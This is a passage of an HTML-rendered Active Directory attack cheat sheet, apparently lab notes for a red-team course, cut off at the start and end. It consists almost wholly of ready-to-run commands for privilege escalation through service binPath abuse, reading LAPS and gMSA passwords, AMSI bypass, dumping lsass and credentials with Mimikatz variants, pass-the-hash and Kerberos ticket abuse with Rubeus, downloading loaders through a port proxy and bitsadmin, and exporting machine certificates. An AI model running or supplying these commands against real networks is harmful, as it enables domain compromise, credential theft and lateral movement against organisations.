</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">ALG</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="w"> </span><span class="s2">"net localgroup administrators domain\user
/add"</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">ALG</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">ALG</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">ALG</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\WINDOWS\System32\alg.exe"</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">ALG</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">ALG</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Look for local administrative access w/ Powerview</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Find-LocalAdminAccess</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="n">Find-WMILocalAdminAccess.ps1</span><span class="w">
</span><span class="nx">Find-PSRemotingLocalAdminAccess.ps1</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Recursively look for group membership</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">function</span><span class="w"> </span><span class="nf">Get-ADPrincipalGroupMembershipRecursive</span><span class="w"> </span><span class="p">(</span><span class="nv">$SamAccountName</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
  </span><span class="nv">$groups</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="err">Get-ADPrincipalGroupMembership</span><span class="w"> </span><span class="err">-Identity</span><span class="w"> </span><span class="nv">$SamAccountName</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="err">select</span><span class="w"> </span><span class="err">-ExpandProperty</span><span class="w"> </span><span class="err">distinguishedname</span><span class="p">)</span><span class="w"> 
  </span><span class="nv">$groups</span><span class="w">
  </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$groups</span><span class="o">.</span><span class="nf">count</span><span class="w"> </span><span class="o">-gt</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$group</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$groups</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="n">Get-ADPrincipalGroupMembershipRecursive</span><span class="w"> </span><span class="nv">$group</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p>ACL entries</p>
      </blockquote>

      <p><strong>Check if any of the groups has interesting ACL entries</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReferenceName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'managers'</span><span class="p">}</span><span class="w">
</span><span class="n">Get-DomainObjectAcl</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">machineadmins</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Add-Member</span><span class="w"> </span><span class="nx">NoteProperty</span><span class="w"> </span><span class="s1">'IdentityName'</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Convert-SidToName</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">SecurityIdentifier</span><span class="p">);</span><span class="bp">$_</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'managers'</span><span class="p">}</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>LAPS</summary>
    <div class="content">

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="n">C:\AD\Tools\Get-LapsPermissions.ps1</span><span class="w">
</span></code></pre></div>      </div>

      <p>With Powerview:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainOU</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-DomainObjectAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ObjectAceType</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'ms-Mcs-AdmPwd'</span><span class="p">)</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="p">(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ActiveDirectoryRights</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'ReadProperty'</span><span class="p">)}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Add-Member</span><span class="w"> </span><span class="nx">NoteProperty</span><span class="w"> </span><span class="s1">'IdentityName'</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Convert-SidToName</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">SecurityIdentifier</span><span class="p">);</span><span class="w"> </span><span class="bp">$_</span><span class="p">}</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Read the password</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">ms-mcs-admpwd</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">ms-mcs-admpwd</span><span class="w">
</span><span class="n">Get-AdmPwdPassword</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w">
</span><span class="n">Get-DomainObject</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">ms-mcs-admpwd</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Access the machine with the password</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-u</span><span class="p">:</span><span class="o">.</span><span class="nx">\administrator</span><span class="w"> </span><span class="nt">-p</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">passwd</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="nv">$passwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'&lt;password&gt;'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="nv">$creds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="p">(</span><span class="s2">"&lt;computer&gt;\administrator"</span><span class="p">,</span><span class="w"> </span><span class="nv">$passwd</span><span class="p">)</span><span class="w">
</span><span class="nv">$mailmgmt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$creds</span><span class="w">
</span><span class="nv">$mailmgmt</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Extract Credentials</summary>
    <div class="content">
      <p> </p>

      <p>winrs:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">winrs</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">x:</span><span class="w"> </span><span class="nx">\\</span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="nx">\C</span><span class="err">$</span><span class="nx">\Users\Public</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="nx">\Administrator</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">password</span><span class="err">&gt;</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\Loader.exe</span><span class="w"> </span><span class="nx">x:\Loader.exe</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">x:</span><span class="w"> </span><span class="nx">/d</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Bypass behaviour detection</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-u</span><span class="p">:</span><span class="o">.</span><span class="nx">\administrator</span><span class="w"> </span><span class="nt">-p</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">password</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">interface</span><span class="w"> </span><span class="nx">portproxy</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">v4tov4</span><span class="w"> </span><span class="nx">listenport</span><span class="o">=</span><span class="mi">8080</span><span class="w"> </span><span class="n">listenaddress</span><span class="o">=</span><span class="mf">0.0</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">0</span><span class="w"> </span><span class="n">connectport</span><span class="o">=</span><span class="mi">80</span><span class="w"> </span><span class="n">connectaddress</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="nf">100</span><span class="o">.</span><span class="nf">X</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Extract</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\Public\Loader.exe</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">http://127.0.0.1:8080/SafetyKatz.exe</span><span class="w">
</span><span class="n">sekurlsa::keys</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Microsoft signed binary to download NetLoader</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-u</span><span class="p">:</span><span class="o">.</span><span class="nx">\administrator</span><span class="w"> </span><span class="nt">-p</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">password</span><span class="err">&gt;</span><span class="w">
</span><span class="s2">"bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\Users\\Public\\Loader.exe"</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>PowerShell Remoting and Invoke-Mimi</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$passwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'&lt;password&gt;'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="nv">$creds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="p">(</span><span class="s2">"&lt;computer&gt;\administrator"</span><span class="p">,</span><span class="w"> </span><span class="nv">$passwd</span><span class="p">)</span><span class="w">
</span><span class="nv">$mailmgmt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$creds</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nv">$mailmgmt</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Bypass AMSI before proceeding</strong>!</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="nx">C:\AD\Tools\Invoke-Mimi.ps1</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$mailmgmt</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nv">$mailmgmt</span><span class="w">
</span><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"sekurlsa::keys"'</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>gMSA</summary>
    <div class="content">
      <p> </p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="nx">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1</span><span class="w">
</span><span class="n">Get-ADServiceAccount</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w">
</span><span class="n">Get-ADServiceAccount</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">jumpone</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">PrincipalsAllowedToRetrieveManagedPassword</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p>You have to open a shell with the user that has permission to read gMSA, after that</p>
      </blockquote>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Import</span><span class="w"> </span><span class="nx">AD</span><span class="w"> </span><span class="nx">Module</span><span class="w"> </span><span class="nx">again</span><span class="p">,</span><span class="w"> </span><span class="nx">then:</span><span class="w">
</span><span class="nv">$Passwordblob</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Get-ADServiceAccount</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">jumpone</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">msDS-ManagedPassword</span><span class="p">)</span><span class="o">.</span><span class="s1">'msDS-ManagedPassword'</span><span class="w">
</span><span class="n">To</span><span class="w"> </span><span class="nx">decode</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">we</span><span class="w"> </span><span class="nx">can</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">DSinternals:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1</span><span class="w">
</span><span class="nv">$decodedpwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertFrom-ADManagedPasswordBlob</span><span class="w"> </span><span class="nv">$Passwordblob</span><span class="w">
</span><span class="n">ConvertTo-NTHash</span><span class="w"> </span><span class="err">–</span><span class="nx">Password</span><span class="w"> </span><span class="nv">$decodedpwd</span><span class="o">.</span><span class="nf">SecureCurrentPassword</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p>After that, you can PTH to see if the user has access to another machine!</p>
      </blockquote>

    </div>
  </details>

  <details>
    <summary>PTH</summary>
    <div class="content">

      <p><strong>From an elevated shell</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"sekurlsa::opassth /user:&lt;user&gt; /domain:&lt;domain&gt; /aes256:&lt;password&gt; /run:cmd.exe"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>using NTLM</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"sekurlsa::opassth /user:&lt;user&gt; /domain:&lt;domain&gt;  /ntlm:&lt;password&gt; /run:cmd.exe"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">

</span><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/aes256:</span><span class="err">&lt;</span><span class="nx">password</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/impersonateuser:administrator</span><span class="w"> </span><span class="nx">/msdsspn:CIFS/</span><span class="err">&lt;</span><span class="nx">machine.domain</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/altservice:HTTP</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">domain</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Doesn’t need elevation</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">domain</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/aes256:</span><span class="err">&lt;</span><span class="nx">password</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">opsec</span><span class="w"> </span><span class="nx">/createnetonly:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Application Whitelisting</summary>
    <div class="content">

      <blockquote>
        <p>CLM, AppLocker, WDAC</p>
      </blockquote>

      <p><strong>Verify if PowerShell is running in Constrained Language Mode</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">$ExecutionContext</span><span class="o">.</span><span class="nf">SessionState</span><span class="o">.</span><span class="nf">LanguageMode</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Check for AppLocker</strong> (if there is an error, the AppLocker is not in use):</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM\Software\Policies\Microsoft\Windows\SRPV2</span><span class="w">
</span><span class="n">Get-AppLockerPolicy</span><span class="w"> </span><span class="err">–</span><span class="nx">Effective</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Verify WDAC</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-CimInstance</span><span class="w"> </span><span class="nt">-ClassName</span><span class="w"> </span><span class="nx">Win32_DeviceGuard</span><span class="w"> </span><span class="nt">-Namespace</span><span class="w"> </span><span class="nx">root\Microsoft\Windows\DeviceGuard</span><span class="w">
</span><span class="n">CodeIntegrityPolicyEnforcementStatus</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">2</span><span class="w">
</span><span class="n">UsermodeCodeIntegrityPolicyEnforcementStatus</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">2</span><span class="w">
</span></code></pre></div>      </div>

      <p>Check out <a href="https://lolbas-project.github.io/">Lolbas Project on Github</a></p>

      <blockquote>
        <p>Lets DUMP lsass*</p>
      </blockquote>

      <p><strong>Get the PID of lsass.exe process</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tasklist</span><span class="w"> </span><span class="nx">/FI</span><span class="w"> </span><span class="s2">"IMAGENAME eq lsass.exe"</span><span class="w">
</span><span class="n">rundll32.exe</span><span class="w"> </span><span class="nx">C:\windows\System32\comsvcs.dll</span><span class="p">,</span><span class="w"> </span><span class="nx">MiniDump</span><span class="w"> </span><span class="nx">708</span><span class="w"> </span><span class="nx">C:\Users\Public\lsass.dmp</span><span class="w"> </span><span class="nx">full</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Copy the <code class="language-plaintext highlighter-rouge">lsass</code> to your machine</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">\\us-jump\C</span><span class="err">$</span><span class="nx">\Users\Public\lsass.dmp</span><span class="w"> </span><span class="nx">C:\AD\Tools\lsass.dmp</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Run Mimikatz with Admin Priv, then</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sekurlsa::minidump</span><span class="w"> </span><span class="nx">C:\AD\Tools\lsass.DMP</span><span class="w">
</span><span class="n">privilege::debug</span><span class="w">
</span><span class="nx">sekurlsa::keys</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Check for Certificates</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">\\us-jump\C</span><span class="err">$</span><span class="nx">\Users\Public\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\InShellProf.dll</span><span class="w"> </span><span class="nx">\\us-jump\C</span><span class="err">$</span><span class="nx">\Users\Public\InShellProf.dll</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span></code></pre></div>      </div>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">us-jump</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">C:\Users\Public\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="nx">ls</span><span class="w"> </span><span class="nx">cert:\LocalMachine\My</span><span class="w">
</span><span class="n">ls</span><span class="w"> </span><span class="nx">cert:\LocalMachine\My\BAD78F43BB4CB13C4843E49B51AA051530FFBBDB</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Export-PfxCertificate</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="nx">C:\Users\Public\user.pfx</span><span class="w"> </span><span class="nt">-Password</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-String</span><span class="w"> </span><span class="s1">'SecretPass@123'</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="p">)</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Copy the certificate</strong>:</p>
      <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo F | xcopy \\us-jump\C$\Users\Public\user.pfx C:\AD\Tools\user.pfx
</code></pre></div>      </div>

    </div>
  </details>
  
  <details>
    <summary>Unconstrained delegation</summary>
    <div class="content">
      <p> </p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">TrustedForDelegation</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$True</span><span class="p">}</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Access the machine with unconstrained deleg, then</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="nx">cd</span><span class="w"> </span><span class="nx">C:\AD\Tools\</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1</span><span class="w">
</span><span class="nx">Find-PSRemotingLocalAdminAccess</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Copy Rubeus using xcopy and execute using winrs</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">\\us-web\C</span><span class="err">$</span><span class="nx">\Users\Public\Rubeus.exe</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">us-web</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w">
</span><span class="n">C:\Users\Public\Rubeus.exe</span><span class="w"> </span><span class="nx">monitor</span><span class="w"> </span><span class="nx">/targetuser:DC</span><span class="err">$</span><span class="w"> </span><span class="nx">/interval:5</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Copy and execute Rubeus using PowerShell Remoting</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$usweb1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="nx">us-web</span><span class="w">
</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nt">-ToSession</span><span class="w"> </span><span class="nv">$usweb1</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nt">-Destination</span><span class="w"> </span><span class="nx">C:\Users\Public</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nv">$usweb1</span><span class="w">
</span><span class="n">cd</span><span class="w"> </span><span class="nx">C:\Users\Public</span><span class="w"> </span><span class="o">.</span><span class="nx">\Rubeus.exe</span><span class="w"> </span><span class="nx">monitor</span><span class="w"> </span><span class="nx">/targetuser:DC</span><span class="err">$</span><span class="w"> </span><span class="nx">/interval:5</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Abuse the printer bug</strong>:</p>
